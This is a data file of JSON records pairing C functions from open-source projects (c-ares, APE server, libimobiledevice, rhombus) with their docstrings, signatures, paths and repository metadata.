{"docstring": "/* ares_dup() duplicates a channel handle with all its options and returns a\n   new channel handle */\n", "func_signal": "int ares_dup(ares_channel *dest, ares_channel src)", "code": "{\n  struct ares_options opts;\n  struct ares_addr_node *servers;\n  int ipv6_nservers = 0;\n  int i, rc;\n  int optmask;\n\n  *dest = NULL; /* in case of failure return NULL explicitly */\n\n  /* First get the options supported by the old ares_save_options() function,\n     which is most of them */\n  rc = ares_save_options(src, &opts, &optmask);\n  if(rc)\n    return rc;\n\n  /* Then create the new channel with those options */\n  rc = ares_init_options(dest, &opts, optmask);\n\n  /* destroy the options copy to not leak any memory */\n  ares_destroy_options(&opts);\n\n  if(rc)\n    return rc;\n\n  /* Now clone the options that ares_save_options() doesn't support. */\n  (*dest)->sock_create_cb      = src->sock_create_cb;\n  (*dest)->sock_create_cb_data = src->sock_create_cb_data;\n\n  /* Full name server cloning required when not all are IPv4 */\n  for (i = 0; i < src->nservers; i++)\n    {\n      if (src->servers[i].addr.family != AF_INET) {\n        ipv6_nservers++;\n        break;\n      }\n    }\n  if (ipv6_nservers) {\n    rc = ares_get_servers(src, &servers);\n    if (rc != ARES_SUCCESS)\n      return rc;\n    rc = ares_set_servers(*dest, servers);\n    ares_free_data(servers);\n    if (rc != ARES_SUCCESS)\n      return rc;\n  }\n\n  return ARES_SUCCESS; /* everything went fine */\n}", "path": "deps\\c-ares\\ares_init.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* !WATT32 */\n", "func_signal": "static int set_search(ares_channel channel, const char *str)", "code": "{\n  int n;\n  const char *p, *q;\n\n  if(channel->ndomains != -1) {\n    /* if we already have some domains present, free them first */\n    for(n=0; n < channel->ndomains; n++)\n      free(channel->domains[n]);\n    free(channel->domains);\n    channel->domains = NULL;\n    channel->ndomains = -1;\n  }\n\n  /* Count the domains given. */\n  n = 0;\n  p = str;\n  while (*p)\n    {\n      while (*p && !ISSPACE(*p))\n        p++;\n      while (ISSPACE(*p))\n        p++;\n      n++;\n    }\n\n  if (!n)\n    {\n      channel->ndomains = 0;\n      return ARES_SUCCESS;\n    }\n\n  channel->domains = malloc(n * sizeof(char *));\n  if (!channel->domains)\n    return ARES_ENOMEM;\n\n  /* Now copy the domains. */\n  n = 0;\n  p = str;\n  while (*p)\n    {\n      channel->ndomains = n;\n      q = p;\n      while (*q && !ISSPACE(*q))\n        q++;\n      channel->domains[n] = malloc(q - p + 1);\n      if (!channel->domains[n])\n        return ARES_ENOMEM;\n      memcpy(channel->domains[n], p, q - p);\n      channel->domains[n][q - p] = 0;\n      p = q;\n      while (ISSPACE(*p))\n        p++;\n      n++;\n    }\n  channel->ndomains = n;\n\n  return ARES_SUCCESS;\n}", "path": "deps\\c-ares\\ares_init.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Initialize a new head node */\n", "func_signal": "void ares__init_list_head(struct list_node* head)", "code": "{\n  head->prev = head;\n  head->next = head;\n  head->data = NULL;\n}", "path": "deps\\c-ares\\ares_llist.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* ape_socket object is released after this call */\n", "func_signal": "ape_server *ape_server_init(ape_cfg_server_t *conf, ape_global *ape)", "code": "{\n    ape_socket *socket;\n    ape_server *server;\n    \n    uint16_t port;\n    char *local_ip, *cert, *key;\n    \n    port = conf->port;\n    local_ip = conf->ip;\n    cert = conf->SSL.cert_path;\n    key  = conf->SSL.key_path;\n\n    if ((socket = APE_socket_new((cert != NULL &&\n        conf->SSL.enabled ? APE_SOCKET_PT_SSL : APE_SOCKET_PT_TCP), 0, ape)) == NULL ||\n        APE_socket_listen(socket, port, local_ip) != 0) {\n\n        printf(\"[Server] Failed to initialize %s:%d\\n\", local_ip, port);\n        APE_socket_destroy(socket);\n        return NULL;\n    }\n\n    server          = malloc(sizeof(*server));\n    server->socket  = socket;\n\n    if (*local_ip == '*' || *local_ip == '\\0') {\n        strcpy(server->ip, \"0.0.0.0\");\n    } else {\n        strncpy(server->ip, local_ip, 15);\n    }\n    server->ip[15]  = '\\0';\n    server->port    = port;\n\n    socket->callbacks.on_read       = ape_server_on_read;\n    socket->callbacks.on_connect    = ape_server_on_connect;\n    socket->callbacks.on_disconnect = ape_server_on_disconnect;\n    socket->_ctx                    = server; /* link the socket to the server struct */\n\t\n\tif (APE_SOCKET_ISSECURE(socket)) {\n\t\tif ((socket->SSL.ssl = ape_ssl_init_ctx(cert, key)) == NULL) {\n\t\t    APE_socket_destroy(socket);\n\t\t    printf(\"[Server] Failed to start %s:%d (Failed to init SSL)\\n\", server->ip, server->port);\n\t\t    free(server);\n\t\t    return NULL;\n\t\t}\n\t}\n\n    printf(\"[Server] Starting %s:%d %s\\n\", server->ip, server->port, (APE_SOCKET_ISSECURE(socket) ? \"[SSL server]\" : \"\"));\n\n    return server;\n}", "path": "src\\core\\ape_server.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/* Like ares_expand_name but returns EBADRESP in case of invalid input. */\n", "func_signal": "int ares__expand_name_for_response(const unsigned char *encoded,\n                                   const unsigned char *abuf, int alen,\n                                   char **s, long *enclen)", "code": "{\n  int status = ares_expand_name(encoded, abuf, alen, s, enclen);\n  if (status == ARES_EBADNAME)\n    status = ARES_EBADRESP;\n  return status;\n}", "path": "deps\\c-ares\\ares_expand_name.c", "repo_name": "paraboul/APE-Server-v2", "stars": 41, "license": "None", "language": "c", "size": 3163}
{"docstring": "/**\n * Enables SSL for the given connection.\n *\n * @param connection The connection to enable SSL for.\n *\n * @return IDEVICE_E_SUCCESS on success, IDEVICE_E_INVALID_ARG when connection\n *     is NULL or connection->ssl_data is non-NULL, or IDEVICE_E_SSL_ERROR when\n *     SSL initialization, setup, or handshake fails.\n */\n", "func_signal": "idevice_error_t idevice_connection_enable_ssl(idevice_connection_t connection)", "code": "{\n\tif (!connection || connection->ssl_data)\n\t\treturn IDEVICE_E_INVALID_ARG;\n\n\tidevice_error_t ret = IDEVICE_E_SSL_ERROR;\n\tuint32_t return_me = 0;\n\n\tssl_data_t ssl_data_loc = (ssl_data_t)malloc(sizeof(struct ssl_data_private));\n\n\t/* Set up GnuTLS... */\n\tdebug_info(\"enabling SSL mode\");\n\terrno = 0;\n\tgnutls_global_init();\n\tgnutls_certificate_allocate_credentials(&ssl_data_loc->certificate);\n\tgnutls_certificate_set_x509_trust_file(ssl_data_loc->certificate, \"hostcert.pem\", GNUTLS_X509_FMT_PEM);\n\tgnutls_init(&ssl_data_loc->session, GNUTLS_CLIENT);\n\t{\n\t\tint protocol_priority[16] = { GNUTLS_SSL3, 0 };\n\t\tint kx_priority[16] = { GNUTLS_KX_ANON_DH, GNUTLS_KX_RSA, 0 };\n\t\tint cipher_priority[16] = { GNUTLS_CIPHER_AES_128_CBC, GNUTLS_CIPHER_AES_256_CBC, 0 };\n\t\tint mac_priority[16] = { GNUTLS_MAC_SHA1, GNUTLS_MAC_MD5, 0 };\n\t\tint comp_priority[16] = { GNUTLS_COMP_NULL, 0 };\n\n\t\tgnutls_cipher_set_priority(ssl_data_loc->session, cipher_priority);\n\t\tgnutls_compression_set_priority(ssl_data_loc->session, comp_priority);\n\t\tgnutls_kx_set_priority(ssl_data_loc->session, kx_priority);\n\t\tgnutls_protocol_set_priority(ssl_data_loc->session, protocol_priority);\n\t\tgnutls_mac_set_priority(ssl_data_loc->session, mac_priority);\n\t}\n\tgnutls_credentials_set(ssl_data_loc->session, GNUTLS_CRD_CERTIFICATE, ssl_data_loc->certificate); /* this part is killing me. */\n\n\tdebug_info(\"GnuTLS step 1...\");\n\tgnutls_transport_set_ptr(ssl_data_loc->session, (gnutls_transport_ptr_t)connection);\n\tdebug_info(\"GnuTLS step 2...\");\n\tgnutls_transport_set_push_function(ssl_data_loc->session, (gnutls_push_func) & internal_ssl_write);\n\tdebug_info(\"GnuTLS step 3...\");\n\tgnutls_transport_set_pull_function(ssl_data_loc->session, (gnutls_pull_func) & internal_ssl_read);\n\tdebug_info(\"GnuTLS step 4 -- now handshaking...\");\n\tif (errno)\n\t\tdebug_info(\"WARN: errno says %s before handshake!\", strerror(errno));\n\treturn_me = gnutls_handshake(ssl_data_loc->session);\n\tdebug_info(\"GnuTLS handshake done...\");\n\n\tif (return_me != GNUTLS_E_SUCCESS) {\n\t\tinternal_ssl_cleanup(ssl_data_loc);\n\t\tfree(ssl_data_loc);\n\t\tdebug_info(\"GnuTLS reported something wrong.\");\n\t\tgnutls_perror(return_me);\n\t\tdebug_info(\"oh.. errno says %s\", strerror(errno));\n\t} else {\n\t\tconnection->ssl_data = ssl_data_loc;\n\t\tret = IDEVICE_E_SUCCESS;\n\t\tdebug_info(\"SSL mode enabled\");\n\t}\n\treturn ret;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Release the event callback function that has been registered with\n *  idevice_event_subscribe().\n *\n * @return IDEVICE_E_SUCCESS on success or an error value when an error occured.\n */\n", "func_signal": "idevice_error_t idevice_event_unsubscribe()", "code": "{\n\tevent_cb = NULL;\n\tint res = usbmuxd_unsubscribe();\n\tif (res != 0) {\n\t\tdebug_info(\"Error %d when unsubscribing usbmux event callback!\", res);\n\t\treturn IDEVICE_E_UNKNOWN_ERROR;\n\t}\n\treturn IDEVICE_E_SUCCESS;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Internally used function to send raw data over the given connection.\n */\n", "func_signal": "static idevice_error_t internal_connection_send(idevice_connection_t connection, const char *data, uint32_t len, uint32_t *sent_bytes)", "code": "{\n\tif (!connection || !data) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\n\tif (connection->type == CONNECTION_USBMUXD) {\n\t\tint res = usbmuxd_send((int)(long)connection->data, data, len, sent_bytes);\n\t\tif (res < 0) {\n\t\t\tdebug_info(\"ERROR: usbmuxd_send returned %d (%s)\", res, strerror(-res));\n\t\t\treturn IDEVICE_E_UNKNOWN_ERROR;\n\t\t}\n\t\treturn IDEVICE_E_SUCCESS;\n\t} else {\n\t\tdebug_info(\"Unknown connection type %d\", connection->type);\n\t}\n\treturn IDEVICE_E_UNKNOWN_ERROR;\n\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Internally used gnutls callback function for receiving encrypted data.\n */\n", "func_signal": "static ssize_t internal_ssl_read(gnutls_transport_ptr_t transport, char *buffer, size_t length)", "code": "{\n\tint bytes = 0, pos_start_fill = 0;\n\tsize_t tbytes = 0;\n\tint this_len = length;\n\tidevice_error_t res;\n\tidevice_connection_t connection = (idevice_connection_t)transport;\n\tchar *recv_buffer;\n\n\tdebug_info(\"pre-read client wants %zi bytes\", length);\n\n\trecv_buffer = (char *) malloc(sizeof(char) * this_len);\n\n\t/* repeat until we have the full data or an error occurs */\n\tdo {\n\t\tif ((res = internal_connection_receive(connection, recv_buffer, this_len, (uint32_t*)&bytes)) != IDEVICE_E_SUCCESS) {\n\t\t\tdebug_info(\"ERROR: idevice_connection_receive returned %d\", res);\n\t\t\treturn res;\n\t\t}\n\t\tdebug_info(\"post-read we got %i bytes\", bytes);\n\n\t\t/* increase read count */\n\t\ttbytes += bytes;\n\n\t\t/* fill the buffer with what we got right now */\n\t\tmemcpy(buffer + pos_start_fill, recv_buffer, bytes);\n\t\tpos_start_fill += bytes;\n\n\t\tif (tbytes >= length) {\n\t\t\tbreak;\n\t\t}\n\n\t\tthis_len = length - tbytes;\n\t\tdebug_info(\"re-read trying to read missing %i bytes\", this_len);\n\t} while (tbytes < length);\n\n\tif (recv_buffer) {\n\t\tfree(recv_buffer);\n\t}\n\treturn tbytes;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Send data to a device via the given connection.\n *\n * @param connection The connection to send data over.\n * @param data Buffer with data to send.\n * @param len Size of the buffer to send.\n * @param sent_bytes Pointer to an uint32_t that will be filled\n *   with the number of bytes actually sent.\n *\n * @return IDEVICE_E_SUCCESS if ok, otherwise an error code.\n */\n", "func_signal": "idevice_error_t idevice_connection_send(idevice_connection_t connection, const char *data, uint32_t len, uint32_t *sent_bytes)", "code": "{\n\tif (!connection || !data || (connection->ssl_data && !connection->ssl_data->session)) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\n\tif (connection->ssl_data) {\n\t\tssize_t sent = gnutls_record_send(connection->ssl_data->session, (void*)data, (size_t)len);\n\t\tif ((uint32_t)sent == (uint32_t)len) {\n\t\t\t*sent_bytes = sent;\n\t\t\treturn IDEVICE_E_SUCCESS;\n\t\t}\n\t\t*sent_bytes = 0;\n\t\treturn IDEVICE_E_SSL_ERROR;\n\t}\n\treturn internal_connection_send(connection, data, len, sent_bytes);\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Disconnect from the device and clean up the connection structure.\n *\n * @param connection The connection to close.\n *\n * @return IDEVICE_E_SUCCESS if ok, otherwise an error code.\n */\n", "func_signal": "idevice_error_t idevice_disconnect(idevice_connection_t connection)", "code": "{\n\tif (!connection) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\t/* shut down ssl if enabled */\n\tif (connection->ssl_data) {\n\t\tidevice_connection_disable_ssl(connection);\n\t}\n\tidevice_error_t result = IDEVICE_E_UNKNOWN_ERROR;\n\tif (connection->type == CONNECTION_USBMUXD) {\n\t\tusbmuxd_disconnect((int)(long)connection->data);\n\t\tresult = IDEVICE_E_SUCCESS;\n\t} else {\n\t\tdebug_info(\"Unknown connection type %d\", connection->type);\n\t}\n\tfree(connection);\n\treturn result;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Internally used function for cleaning up SSL stuff.\n */\n", "func_signal": "static void internal_ssl_cleanup(ssl_data_t ssl_data)", "code": "{\n\tif (!ssl_data)\n\t\treturn;\n\n\tif (ssl_data->session) {\n\t\tgnutls_deinit(ssl_data->session);\n\t}\n\tif (ssl_data->certificate) {\n\t\tgnutls_certificate_free_credentials(ssl_data->certificate);\n\t}\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Internally used gnutls callback function for sending encrypted data.\n */\n", "func_signal": "static ssize_t internal_ssl_write(gnutls_transport_ptr_t transport, char *buffer, size_t length)", "code": "{\n\tuint32_t bytes = 0;\n\tidevice_connection_t connection = (idevice_connection_t)transport;\n\tdebug_info(\"pre-send length = %zi\", length);\n\tinternal_connection_send(connection, buffer, length, &bytes);\n\tdebug_info(\"post-send sent %i bytes\", bytes);\n\treturn bytes;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Internally used function for receiving raw data over the given connection.\n */\n", "func_signal": "static idevice_error_t internal_connection_receive(idevice_connection_t connection, char *data, uint32_t len, uint32_t *recv_bytes)", "code": "{\n\tif (!connection) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\n\tif (connection->type == CONNECTION_USBMUXD) {\n\t\tint res = usbmuxd_recv((int)(long)connection->data, data, len, recv_bytes);\n\t\tif (res < 0) {\n\t\t\tdebug_info(\"ERROR: usbmuxd_recv returned %d (%s)\", res, strerror(-res));\n\t\t\treturn IDEVICE_E_UNKNOWN_ERROR;\n\t\t}\n\n\t\treturn IDEVICE_E_SUCCESS;\n\t} else {\n\t\tdebug_info(\"Unknown connection type %d\", connection->type);\n\t}\n\treturn IDEVICE_E_UNKNOWN_ERROR;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Disable SSL for the given connection.\n *\n * @param connection The connection to disable SSL for.\n *\n * @return IDEVICE_E_SUCCESS on success, IDEVICE_E_INVALID_ARG when connection\n *     is NULL. This function also returns IDEVICE_E_SUCCESS when SSL is not\n *     enabled and does no further error checking on cleanup.\n */\n", "func_signal": "idevice_error_t idevice_connection_disable_ssl(idevice_connection_t connection)", "code": "{\n\tif (!connection)\n\t\treturn IDEVICE_E_INVALID_ARG;\n\tif (!connection->ssl_data) {\n\t\t/* ignore if ssl is not enabled */ \n\t\treturn IDEVICE_E_SUCCESS;\n\t}\n\n\tif (connection->ssl_data->session) {\n\t\tgnutls_bye(connection->ssl_data->session, GNUTLS_SHUT_RDWR);\n\t}\n\tinternal_ssl_cleanup(connection->ssl_data);\n\tfree(connection->ssl_data);\n\tconnection->ssl_data = NULL;\n\n\tdebug_info(\"SSL mode disabled\");\n\n\treturn IDEVICE_E_SUCCESS;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Gets the handle of the device. Depends on the connection type.\n */\n", "func_signal": "idevice_error_t idevice_get_handle(idevice_t device, uint32_t *handle)", "code": "{\n\tif (!device)\n\t\treturn IDEVICE_E_INVALID_ARG;\n\n\tif (device->conn_type == CONNECTION_USBMUXD) {\n\t\t*handle = (uint32_t)(long)device->conn_data;\n\t\treturn IDEVICE_E_SUCCESS;\n\t} else {\n\t\tdebug_info(\"Unknown connection type %d\", device->conn_type);\n\t}\n\treturn IDEVICE_E_UNKNOWN_ERROR;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Receive data from a device via the given connection.\n * This function will return after the given timeout even if no data has been\n * received.\n *\n * @param connection The connection to receive data from.\n * @param data Buffer that will be filled with the received data.\n *   This buffer has to be large enough to hold len bytes.\n * @param len Buffer size or number of bytes to receive.\n * @param recv_bytes Number of bytes actually received.\n * @param timeout Timeout in milliseconds after which this function should\n *   return even if no data has been received.\n *\n * @return IDEVICE_E_SUCCESS if ok, otherwise an error code.\n */\n", "func_signal": "idevice_error_t idevice_connection_receive_timeout(idevice_connection_t connection, char *data, uint32_t len, uint32_t *recv_bytes, unsigned int timeout)", "code": "{\n\tif (!connection || (connection->ssl_data && !connection->ssl_data->session)) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\n\tif (connection->ssl_data) {\n\t\tssize_t received = gnutls_record_recv(connection->ssl_data->session, (void*)data, (size_t)len);\n\t\tif (received > 0) {\n\t\t\t*recv_bytes = received;\n\t\t\treturn IDEVICE_E_SUCCESS;\n\t\t}\n\t\t*recv_bytes = 0;\n\t\treturn IDEVICE_E_SSL_ERROR;\n\t}\n\treturn internal_connection_receive_timeout(connection, data, len, recv_bytes, timeout);\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Internally used function for receiving raw data over the given connection\n * using a timeout.\n */\n", "func_signal": "static idevice_error_t internal_connection_receive_timeout(idevice_connection_t connection, char *data, uint32_t len, uint32_t *recv_bytes, unsigned int timeout)", "code": "{\n\tif (!connection) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\n\tif (connection->type == CONNECTION_USBMUXD) {\n\t\tint res = usbmuxd_recv_timeout((int)(long)connection->data, data, len, recv_bytes, timeout);\n\t\tif (res < 0) {\n\t\t\tdebug_info(\"ERROR: usbmuxd_recv_timeout returned %d (%s)\", res, strerror(-res));\n\t\t\treturn IDEVICE_E_UNKNOWN_ERROR;\n\t\t}\n\t\treturn IDEVICE_E_SUCCESS;\n\t} else {\n\t\tdebug_info(\"Unknown connection type %d\", connection->type);\n\t}\n\treturn IDEVICE_E_UNKNOWN_ERROR;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Set up a connection to the given device.\n *\n * @param device The device to connect to.\n * @param port The destination port to connect to.\n * @param connection Pointer to an idevice_connection_t that will be filled\n *   with the necessary data of the connection.\n *\n * @return IDEVICE_E_SUCCESS if ok, otherwise an error code.\n */\n", "func_signal": "idevice_error_t idevice_connect(idevice_t device, uint16_t port, idevice_connection_t *connection)", "code": "{\n\tif (!device) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\n\tif (device->conn_type == CONNECTION_USBMUXD) {\n\t\tint sfd = usbmuxd_connect((uint32_t)(long)device->conn_data, port);\n\t\tif (sfd < 0) {\n\t\t\tdebug_info(\"ERROR: Connecting to usbmuxd failed: %d (%s)\", sfd, strerror(-sfd));\n\t\t\treturn IDEVICE_E_UNKNOWN_ERROR;\n\t\t}\n\t\tidevice_connection_t new_connection = (idevice_connection_t)malloc(sizeof(struct idevice_connection_private));\n\t\tnew_connection->type = CONNECTION_USBMUXD;\n\t\tnew_connection->data = (void*)(long)sfd;\n\t\tnew_connection->ssl_data = NULL;\n\t\t*connection = new_connection;\n\t\treturn IDEVICE_E_SUCCESS;\n\t} else {\n\t\tdebug_info(\"Unknown connection type %d\", device->conn_type);\n\t}\n\n\treturn IDEVICE_E_UNKNOWN_ERROR;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Creates an idevice_t structure for the device specified by uuid,\n *  if the device is available.\n *\n * @note The resulting idevice_t structure has to be freed with\n * idevice_free() if it is no longer used.\n *\n * @param device Upon calling this function, a pointer to a location of type\n *  idevice_t. On successful return, this location will be populated.\n * @param uuid The UUID to match.\n *\n * @return IDEVICE_E_SUCCESS if ok, otherwise an error code.\n */\n", "func_signal": "idevice_error_t idevice_new(idevice_t * device, const char *uuid)", "code": "{\n\tusbmuxd_device_info_t muxdev;\n\tint res = usbmuxd_get_device_by_uuid(uuid, &muxdev);\n\tif (res > 0) {\n\t\tidevice_t phone = (idevice_t) malloc(sizeof(struct idevice_private));\n\t\tphone->uuid = strdup(muxdev.uuid);\n\t\tphone->conn_type = CONNECTION_USBMUXD;\n\t\tphone->conn_data = (void*)(long)muxdev.handle;\n\t\t*device = phone;\n\t\treturn IDEVICE_E_SUCCESS;\n\t}\n\t/* other connection types could follow here */\n\n\treturn IDEVICE_E_NO_DEVICE;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Receive data from a device via the given connection.\n * This function is like idevice_connection_receive_timeout, but with a\n * predefined reasonable timeout.\n *\n * @param connection The connection to receive data from.\n * @param data Buffer that will be filled with the received data.\n *   This buffer has to be large enough to hold len bytes.\n * @param len Buffer size or number of bytes to receive.\n * @param recv_bytes Number of bytes actually received.\n *\n * @return IDEVICE_E_SUCCESS if ok, otherwise an error code.\n */\n", "func_signal": "idevice_error_t idevice_connection_receive(idevice_connection_t connection, char *data, uint32_t len, uint32_t *recv_bytes)", "code": "{\n\tif (!connection || (connection->ssl_data && !connection->ssl_data->session)) {\n\t\treturn IDEVICE_E_INVALID_ARG;\n\t}\n\n\tif (connection->ssl_data) {\n\t\tssize_t received = gnutls_record_recv(connection->ssl_data->session, (void*)data, (size_t)len);\n\t\tif (received > 0) {\n\t\t\t*recv_bytes = received;\n\t\t\treturn IDEVICE_E_SUCCESS;\n\t\t}\n\t\t*recv_bytes = 0;\n\t\treturn IDEVICE_E_SSL_ERROR;\n\t}\n\treturn internal_connection_receive(connection, data, len, recv_bytes);\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Cleans up an idevice structure, then frees the structure itself.\n * This is a library-level function; deals directly with the device to tear\n *  down relations, but otherwise is mostly internal.\n * \n * @param device idevice_t to free.\n */\n", "func_signal": "idevice_error_t idevice_free(idevice_t device)", "code": "{\n\tif (!device)\n\t\treturn IDEVICE_E_INVALID_ARG;\n\tidevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;\n\n\tret = IDEVICE_E_SUCCESS;\n\n\tfree(device->uuid);\n\n\tif (device->conn_type == CONNECTION_USBMUXD) {\n\t\tdevice->conn_data = 0;\n\t}\n\tif (device->conn_data) {\n\t\tfree(device->conn_data);\n\t}\n\tfree(device);\n\treturn ret;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Gets the unique id for the device.\n */\n", "func_signal": "idevice_error_t idevice_get_uuid(idevice_t device, char **uuid)", "code": "{\n\tif (!device)\n\t\treturn IDEVICE_E_INVALID_ARG;\n\n\t*uuid = strdup(device->uuid);\n\treturn IDEVICE_E_SUCCESS;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Get a list of currently available devices.\n *\n * @param devices List of uuids of devices that are currently available.\n *   This list is terminated by a NULL pointer.\n * @param count Number of devices found.\n *\n * @return IDEVICE_E_SUCCESS on success or an error value when an error occured.\n */\n", "func_signal": "idevice_error_t idevice_get_device_list(char ***devices, int *count)", "code": "{\n\tusbmuxd_device_info_t *dev_list;\n\n\t*devices = NULL;\n\t*count = 0;\n\n\tif (usbmuxd_get_device_list(&dev_list) < 0) {\n\t\tdebug_info(\"ERROR: usbmuxd is not running!\\n\", __func__);\n\t\treturn IDEVICE_E_NO_DEVICE;\n\t}\n\n\tchar **newlist = NULL;\n\tint i, newcount = 0;\n\n\tfor (i = 0; dev_list[i].handle > 0; i++) {\n\t\tnewlist = realloc(*devices, sizeof(char*) * (newcount+1));\n\t\tnewlist[newcount++] = strdup(dev_list[i].uuid);\n\t\t*devices = newlist;\n\t}\n\tusbmuxd_device_list_free(&dev_list);\n\n\t*count = newcount;\n\tnewlist = realloc(*devices, sizeof(char*) * (newcount+1));\n\tnewlist[newcount] = NULL;\n\t*devices = newlist;\n\n\treturn IDEVICE_E_SUCCESS;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/**\n * Free a list of device uuids.\n *\n * @param devices List of uuids to free.\n *\n * @return Always returnes IDEVICE_E_SUCCESS.\n */\n", "func_signal": "idevice_error_t idevice_device_list_free(char **devices)", "code": "{\n\tif (devices) {\n\t\tint i = 0;\n\t\twhile (devices[i++]) {\n\t\t\tfree(devices[i]);\n\t\t}\n\t\tfree(devices);\n\t}\n\treturn IDEVICE_E_SUCCESS;\n}", "path": "src\\idevice.c", "repo_name": "posixninja/libimobiledevice", "stars": 62, "license": "lgpl-2.1", "language": "c", "size": 905}
{"docstring": "/*****************************************************************************\n * elfc_hash\n *\n * String hashing function defined in the ELF documentation.\n */\n", "func_signal": "static uint32_t elfc_hash(const char *symbol)", "code": "{\n\tuint32_t h;\n\tuint32_t g;\n\n\th = 0;\n\twhile (*symbol) {\n\t\th = (h << 4) + *symbol;\n\n\t\tg = h & 0xF0000000;\n\t\tif (g) h ^= g >> 24;\n\t\th &= ~g;\n\n\t\tsymbol++;\n\t}\n\n\treturn h;\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/****************************************************************************\n * tolower\n *\n * Converts a given character to lowercase if it is not already and if it has\n * a lowercase version.\n */\n", "func_signal": "int tolower(int c)", "code": "{\n\t\n\tif ((c >= 'A') && (c <= 'Z')) {\n\t\tc += ('a' - 'A');\n\t}\n\n\treturn c;\n}", "path": "libc\\ctype\\tolower.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elfc_resolve_rec\n *\n * Part of elfc_resolve. Recursively performs a depth-first search on the\n * dependency tree of <cache>, checking only leaf nodes for symbols. The \n * breadth-first search is implemented as an iterated depth-first search.\n */\n", "func_signal": "static uint32_t elfc_resolve_rec(struct elf_cache *cache, const char *symbol, uint32_t depth)", "code": "{\n\tconst struct elf32_ehdr *dep;\n\tstruct elf_cache dep_cache;\n\tuint32_t value;\n\tsize_t i;\n\t\n\tif (depth == 0) {\n\t\treturn elfc_resolve_local(cache, symbol);\n\t}\n\n\ti = 0;\n\twhile (1) {\n\t\tdep = elfc_get_needed(cache, i);\n\t\tif (!dep) return 0;\n\t\t\n\t\telf_gencache(&dep_cache, dep, 1);\n\t\tvalue = elfc_resolve_rec(&dep_cache, symbol, depth - 1);\n\t\tif (value) return value;\n\n\t\ti++;\n\t}\n\n\treturn 0;\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
